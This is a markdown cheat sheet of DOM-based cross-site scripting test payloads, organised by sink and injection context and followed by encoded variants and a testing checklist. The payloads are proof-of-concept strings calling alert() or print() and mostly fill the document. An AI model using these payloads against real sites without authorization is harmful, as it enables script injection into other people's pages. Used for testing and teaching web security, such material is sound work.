# DOM XSS Payloads

## 1. Purpose

Payloads for testing DOM-based Cross-Site Scripting.

The payload used depends on the sink and the injection context.

Always identify:

```text
SOURCE → CONTEXT → SINK → PAYLOAD
```

---

# 2. Basic HTML Injection Tests

Use harmless markers first:

```text
domtest123
```

```html
<b>domtest123</b>
```

```html
<i>domtest123</i>
```

```html
<div>domtest123</div>
```

Purpose:

```text
Confirm HTML interpretation
```

---

# 3. Basic DOM XSS Payloads

```html
<script>alert(document.domain)</script>
```

```html
<img src=x onerror=alert(document.domain)>
```

```html
<svg onload=alert(document.domain)>
```

```html
<body onload=alert(document.domain)>
```

---

# 4. Non-Alert Verification

For labs where `alert()` is not suitable:

```html
<img src=x onerror=print()>
```

```html
<svg onload=print()>
```

```html
<script>print()</script>
```

---

# 5. `innerHTML` Testing

If attacker input reaches:

```javascript
element.innerHTML
```

test:

```html
<img src=x onerror=print()>
```

```html
<svg onload=print()>
```

Important:

```text
<script>...</script>
```

may not execute when inserted using `innerHTML`.

Test event-handler-based HTML where appropriate.

---

# 6. `document.write()` Testing

If the sink is:

```javascript
document.write()
```

test:

```html
<img src=x onerror=print()>
```

```html
<svg onload=print()>
```

```html
<script>print()</script>
```

---

# 7. Attribute Context

If input reaches an HTML attribute:

```html
" onmouseover="print()
```

```html
" autofocus onfocus="print()
```

```html
' onmouseover='print()
```

The correct payload depends on:

```text
Quote Type
Attribute
HTML Parser Context
Encoding
```

---

# 8. JavaScript String Context

If input is inserted inside:

```javascript
var x = 'USER_INPUT';
```

test the relevant quote:

```text
'
```

or:

```text
"
```

Then determine whether the string can be escaped safely.

Conceptual test:

```text
'
"
\
```

Do not assume a JavaScript-string payload works in an HTML context.

---

# 9. Template Literal Context

If the application uses:

```javascript
`USER_INPUT`
```

test:

```text
`
```

Then inspect whether the resulting input can influence JavaScript execution.

---

# 10. URL-Based DOM XSS

Potential sources:

```text
location.hash
location.search
location.pathname
document.URL
```

Example:

```text
#<img src=x onerror=print()>
```

or URL-encoded:

```text
#%3Cimg%20src=x%20onerror=print()%3E
```

Whether the payload executes depends on subsequent decoding and the final sink.

---

# 11. JavaScript URL Testing

For URL-sensitive sinks, a lab may require:

```text
javascript:print()
```

Example:

```text
javascript:print()
```

This is particularly relevant when attacker-controlled data reaches a navigation or URL-loading sink.

---

# 12. Event Handler Payloads

Common event-handler tests:

```html
<img src=x onerror=print()>
```

```html
<svg onload=print()>
```

```html
<body onload=print()>
```

```html
<input autofocus onfocus=print()>
```

---

# 13. SVG Payloads

```html
<svg onload=print()>
```

```html
<svg><animate onbegin=print() attributeName=x dur=1s></animate></svg>
```

Use only when the HTML/SVG context permits it.

---

# 14. Image Payloads

```html
<img src=x onerror=print()>
```

```html
<img src=invalid onerror=print()>
```

Useful when:

```text
img
```

elements are allowed by the parser/sanitizer.

---

# 15. Input Element Payloads

```html
<input autofocus onfocus=print()>
```

```html
<input onmouseover=print()>
```

The browser must actually trigger the relevant event.

---

# 16. Context Testing

Before choosing a payload:

```text
1. Identify context.
2. Identify parser.
3. Identify escaping.
4. Identify filtering.
5. Identify sink.
6. Select payload.
```

---

# 17. Encoding Variants

HTML encoding:

```text
%3Cimg%20src=x%20onerror=print()%3E
```

URL encoding:

```text
%6A%61%76%61%73%63%72%69%70%74%3Aprint()
```

The application may decode the input before it reaches the sink.

---

# 18. Marker-First Method

Always begin with:

```text
domtest123
```

Then:

```text
domtest123
    ↓
HTML interpretation?
    ↓
Attribute interpretation?
    ↓
JavaScript interpretation?
    ↓
Execution?
```

---

# 19. DOM XSS Testing Checklist

```text
☐ Source identified
☐ Context identified
☐ Sink identified
☐ Marker tested
☐ HTML interpretation tested
☐ Attribute context tested
☐ JavaScript context tested
☐ URL context tested
☐ Encoding checked
☐ Decoding checked
☐ Sanitization checked
☐ Payload executed
☐ Impact confirmed
```

---

# 20. Quick Payload List

```html
<img src=x onerror=print()>
```

```html
<svg onload=print()>
```

```html
<script>print()</script>
```

```text
javascript:print()
```

---

# Final Rule

```text
DO NOT START WITH PAYLOADS.

SOURCE
  ↓
CONTEXT
  ↓
SINK
  ↓
VALIDATION
  ↓
PAYLOAD
  ↓
EXECUTION
```